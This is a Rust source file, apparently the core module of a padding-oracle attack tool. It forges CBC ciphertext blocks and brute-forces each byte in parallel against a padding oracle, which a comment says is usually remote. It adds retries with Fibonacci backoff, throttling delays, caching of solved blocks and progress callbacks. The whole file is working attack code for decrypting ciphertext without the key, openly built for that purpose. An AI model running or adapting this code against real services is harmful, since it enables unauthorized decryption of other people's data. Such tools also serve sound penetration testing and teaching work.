pub(super) mod decryptor;
pub(super) mod encryptor;

use std::{
    sync::{Arc, Mutex},
    thread,
};

use anyhow::{anyhow, Result};
use log::{debug, warn};
use rayon::iter::{IntoParallelIterator, ParallelIterator};
use retry::{delay::Fibonacci, retry_with_index, OperationResult};

use crate::{
    block::{block_size::BlockSizeTrait, Block},
    cache::Cache,
    cypher_text::{
        encode::AmountBlocksTrait,
        forged_cypher_text::{solved::SolvedForgedCypherText, ByteLockResult, ForgedCypherText},
    },
    logging::LOG_TARGET,
    oracle::Oracle,
    other::{RETRY_DELAY_MS, RETRY_MAX_ATTEMPTS},
};

fn solve_block<'a, W, P>(
    oracle: &impl Oracle,
    cache: Arc<Mutex<Option<Cache>>>,
    cypher_text_for_block: &ForgedCypherText<'a>,
    wip_update_ui_callback: W,
    progress_update_ui_callback: P,
) -> Result<SolvedForgedCypherText<'a>>
where
    W: FnMut(Block, usize) + Sync + Send + Clone,
    P: Fn(usize) + Clone,
{
    let block_to_decrypt_idx = cypher_text_for_block.amount_blocks() - 1;
    let mut cypher_text_for_block = cypher_text_for_block.clone();

    // check for a cache hit and short-circuit solving it
    let mut block_solution = cache.lock().unwrap().as_ref().and_then(|cache| {
        cache
            .get(&cypher_text_for_block.as_cache_key())
            .map(|cached_block| {
                let key = cypher_text_for_block.as_cache_key();
                debug!(
                    target: LOG_TARGET,
                    "Cache hit for ({}, {})",
                    key.0.to_hex(),
                    key.1.to_hex()
                );
                (progress_update_ui_callback.clone())(*cached_block.block_size() as usize);

                SolvedForgedCypherText::from((cypher_text_for_block.clone(), cached_block.clone()))
            })
    });

    let mut attempts_to_solve_byte = 1;
    while block_solution.is_none() {
        // TODO: using `parallel-stream` instead of `rayon` would likely be better. The oracle does the hard work, i.e. decryption, and is usually remote. So we're I/O bound, which prefers async, instead of CPU bound.
        let current_byte_solution = (u8::MIN..=u8::MAX)
            .into_par_iter()
            .map(|byte_value| {
                let mut forged_cypher_text = cypher_text_for_block.clone();
                forged_cypher_text.set_current_byte(byte_value);

                let correct_padding =
                    retry_with_index(Fibonacci::from_millis(RETRY_DELAY_MS), |attempt| {
                        validate_while_handling_retries(
                            attempt,
                            byte_value,
                            block_to_decrypt_idx,
                            oracle,
                            &forged_cypher_text,
                        )
                    })
                    .map_err(|e| anyhow!(e.to_string()))?;

                // update UI with attempt
                (wip_update_ui_callback.clone())(
                    forged_cypher_text.forged_block_wip().clone(),
                    block_to_decrypt_idx,
                );

                if correct_padding {
                    debug!(
                        target: LOG_TARGET,
                        "Block {}, byte {}: solved!",
                        block_to_decrypt_idx + 1,
                        *forged_cypher_text.block_size() - forged_cypher_text.bytes_answered(),
                    );

                    Ok(forged_cypher_text.lock_byte())
                } else {
                    Err(anyhow!(
                        "Block {}, byte {}: padding invalid. Forged block was: {}",
                        block_to_decrypt_idx + 1,
                        *forged_cypher_text.block_size() - forged_cypher_text.bytes_answered(),
                        forged_cypher_text.forged_block_wip().to_hex()
                    ))
                }
            })
            .find_any(|potential_solution| potential_solution.is_ok())
            .unwrap_or_else(|| {
                Err(anyhow!(
                    "Block {}, byte {}: decryption failed",
                    block_to_decrypt_idx + 1,
                    *cypher_text_for_block.block_size() - cypher_text_for_block.bytes_answered(),
                ))
            });

        match current_byte_solution {
            Ok(current_byte_solution) => {
                attempts_to_solve_byte = 1;
                (progress_update_ui_callback.clone())(1);

                match current_byte_solution {
                    ByteLockResult::BytesLeft(current_byte_solution) => {
                        cypher_text_for_block = current_byte_solution;
                    }

                    // solving the current byte happens to have solved the whole block!
                    ByteLockResult::Solved(solution) => {
                        // solved block, save to cache
                        let _ = cache
                            .lock()
                            .unwrap()
                            .as_mut()
                            .map(|cache| {
                                cache.insert(
                                    cypher_text_for_block.as_cache_key(),
                                    solution.forged_block_solution().clone(),
                                )
                            })
                            .transpose()?;

                        block_solution = Some(solution);
                    }
                }
            }
            // validation for byte failed, attempt retry
            Err(e) => {
                if attempts_to_solve_byte > RETRY_MAX_ATTEMPTS {
                    return Err(e);
                }

                warn!(
                    target: LOG_TARGET,
                    "Block {}, byte {}: retrying decryption ({}/{})",
                    block_to_decrypt_idx + 1,
                    *cypher_text_for_block.block_size() - cypher_text_for_block.bytes_answered(),
                    attempts_to_solve_byte,
                    RETRY_MAX_ATTEMPTS
                );
                attempts_to_solve_byte += 1;
            }
        }
    }

    Ok(block_solution.expect("`while` loop finished so this must contain a value"))
}

fn validate_while_handling_retries(
    attempt: u64,
    byte_value: u8,
    block_to_decrypt_idx: usize,
    oracle: &impl Oracle,
    forged_cypher_text: &ForgedCypherText,
) -> OperationResult<bool, String> {
    let block_size = *forged_cypher_text.block_size();
    let bytes_answered = forged_cypher_text.bytes_answered();

    if attempt > RETRY_MAX_ATTEMPTS {
        return OperationResult::Err(format!(
            "Block {}, byte {}, value {}: validation failed",
            block_to_decrypt_idx + 1,
            block_size - bytes_answered,
            byte_value
        ));
    }

    thread::sleep(**oracle.thread_delay());

    match oracle.ask_validation(forged_cypher_text) {
        Ok(correct_padding) => OperationResult::Ok(correct_padding),
        Err(e) => {
            warn!(
                target: LOG_TARGET,
                "Block {}, byte {}, value {}: retrying validation ({}/{})",
                block_to_decrypt_idx + 1,
                block_size - bytes_answered,
                byte_value,
                attempt,
                RETRY_MAX_ATTEMPTS
            );
            debug!(target: LOG_TARGET, "{:?}", e);
            OperationResult::Retry(format!(
                "Block {}, byte {}, value {}: retrying validation ({}/{})",
                block_to_decrypt_idx + 1,
                block_size - bytes_answered,
                byte_value,
                attempt,
                RETRY_MAX_ATTEMPTS
            ))
        }
    }
}
